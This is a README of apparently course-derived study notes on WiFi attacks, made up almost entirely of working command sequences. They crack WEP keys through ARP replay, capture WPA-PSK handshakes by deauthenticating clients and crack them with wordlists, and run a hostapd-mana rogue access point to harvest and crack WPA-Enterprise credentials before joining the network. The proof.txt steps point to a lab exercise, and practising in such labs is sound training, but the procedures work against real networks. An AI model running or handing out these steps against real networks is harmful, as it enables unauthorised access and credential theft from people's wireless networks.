# WiFi_Hacking_Memo
Quick notes taken from the course around WiFi hacking
## WEP
1.	Place the wireless interface in monitor mode using the Airmon-ng tool
```
sudo airmon-ng start wlan0
```
2.	Discover nearby WiFi networks using Airodump-ng tool
```
sudo airodump-ng wlan0mon --wps
```
3.	Perform a targeted scan with the AP BSSID and channel discovered from step 2, and redirect the capture to a file named ‘WEP’
```
sudo airodump-ng -c 11 -b XX:XX:XX:XX:XX:XX -w WEP wlan0mon
```
4.	When the above command in step 3 shows at least 1 connected station to the AP, open a new terminal tab and sent ARP replay packets to the said station using Aireplay-ng, by specifying the targeted station ID
```
sudo aireplay-ng -3 -b XX:XX:XX:XX:XX:XX -h XX:XX:XX:XX:XX:XX wlan0mon
```
5.	Back on the previous tab, where Airodump-ng is still running and capturing traffic, the tool should have captured the handshake successfully. Stop Airodump-ng by pressing the CTRL + C keys and stop the monitor mode for the interface
```
sudo airmon-ng stop wlan0
```
6.	Use Aircrack-ng to crack the key from the output file created by Airodump-ng
```
sudo aircrack-ng WEP01.cap
```
7.	Once the key is cracked by Aircrack-ng, use iwconfig to connect the compromised wireless network
```
sudo iwconfig wlan0 essid <SSID_name> key <KEY>
```
8.	Refresh the DHCP client configuration and obtain an IP from the AP
```
sudo dhclient wlan0
```
9.	Get the content of the proof.txt file
```
curl http://192.168.1.1/proof.txt
```
## WPA-PSK (Personal)
1.	Place the wireless interface in monitor mode using Airmon-ng
```
sudo airmon-ng start wlan0
```
2.	Discover nearby WiFi networks using Airodump-ng
```
sudo airodump-ng wlan0mon
```
3.	Perform a targeted scan with the AP BSSID and channel discovered from step 2, and redirect the capture to a file named ‘PSK’
```
sudo airodump-ng --bssid XX:XX:XX:XX:XX:XX --channel 8 --write PSK wlan0mon
```
4.	When the command in step 3 shows at least 1 connected station to the AP, open a new terminal tab and send deauth packets (5) to the said station(s) using Aireplay-ng
```
aireplay-ng -0 5 -a XX:XX:XX:XX:XX:XX wlan0mon
```
5.	Back on the previous tab, where Airodump-ng is still running and capturing traffic, the tool should have captured the handshake successfully, from the deauthenticated client which reconnected. Stop Airodump-ng by pressing the CTRL + C keys and stop the monitor mode for the interface
```
sudo airmon-ng stop wlan0
```
6.	Use Aircrack-ng to crack the key from the output file created by Airodump-ng, with a wordlist specific to WPA attacks
```
sudo aircrack-ng PSK-01.cap -w /usr/share/wordlists/seclists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt
```
7.	When the key is cracked by Aircrack-ng, use wpa_passphrase to create a configuration file to connect the wireless network
```
wpa_passphrase <SSID_name> <KEY> > wpa.conf
```
8.	Connect to the WiFi network using wpa_supplicant with the configuration generated in step 7
```
wpa_supplicant -B -i wlan0 -c ./wpa.conf
```
9.	Refresh the DHCP client configuration and obtain an IP from the AP using dhclient
```
sudo dhclient wlan0
```
10.	Obtain the content of proof.txt
```
curl http://192.168.1.1/proof.txt
```
## WPA-MGT (Enterprise)
1.	Place the wireless interface in monitor mode using the Airmon-ng
```
sudo airmon-ng start wlan0
```
2.	Discover nearby WiFi networks using Airodump-ng
```
sudo airodump-ng wlan0mon
```
3.	Perform a targeted scan with the AP BSSID and channel discovered from step 2, and redirecting the capture to an output file named ‘mgt'
```
sudo airodump-ng -c 10 -w mgt wlan0mon
```
4.	When the above command in step 3 shows at least 1 connected station to the AP, open a new terminal tab and send a deauth packet to the said station/client using Aireplay-ng, by specifying the targeted station ID
```
sudo aireplay-ng -0 1 -a XX:XX:XX:XX:XX:XX -c XX:XX:XX:XX:XX:XX wlan0mon
```
5.	Back on the previous tab, where Airodump-ng is still running and capturing traffic, the tool should have captured the handshake successfully, from the deauthenticated client which reconnected. Stop Airodump-ng by pressing the CTRL + C keys and stop the monitor mode for the interface
```
sudo airmon-ng stop wlan0
```
6.	Since freeradius is already installed on the attacker machine, simply make sure to have certificates in the right place, those will be needed for the hostadp-mana tool used in step 8
```
cd /etc/freeradius/3.0/certs
make
```
7.	Since hostapd-mana is already installed, simply create the configuration file we’ll use, as referenced in [mana.conf](https://github.com/ob1lan/WiFi_Hacking_Memo/blob/main/mana.conf), along with the EAP user file as referenced in [mana.eap.user](https://github.com/ob1lan/WiFi_Hacking_Memo/blob/main/mana.eap.user)

8.	Use hostapd-mana with the configuration files created in step 7 to create a rogue AP
```
sudo hostapd-mana /etc/hostapd-mana/mana.conf
```
9.	After the hostadp-mana tools captured at least 1 authenticated client, stop the capture and verify the content of hostapd.credout to check the captured credentials and get the relevant asleap command to crack them
```
cat /tmp/hostapd.credout
```
10.	Execute the asleap tool command as obtained in step 9 to crack the captured credentials, with the password.lst wordlist from john’s collection
```
asleap -C XX:XX:XX:XX:XX:XX:XX:XX -R XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX -W /usr/share/john/password.lst
```
11.	When asleap is done cracking the credentials, create the mgt.conf file with the above content reflecting the cracked credentials, this file will be used in step 12 to connect the network using with wpa-supplicant
```
network={
        scan_ssid=1 
        eap=PEAP 
        ssid="SSID_NAME" 
        key_mgmt=WPA-EAP 
        identity="DOMAIN\USERNAME" 
        password="PASSWORD_CRACKED" 
        phase1="peaplabel=O" 
        phase2="auth=MSCHAPV2"
}
```
12.	Connected to the WiFi network using wpa_supplicant with the configuration generated in step 11
```
wpa_supplicant -B -i wlan0 -c ./mgt.conf
```
13.	Refresh the DHCP client configuration and obtain an IP from the AP
```
sudo dhclient wlan0
```
14.	Obtain the content of the proof.txt file
```
curl http://192.168.1.1/proof.txt
```
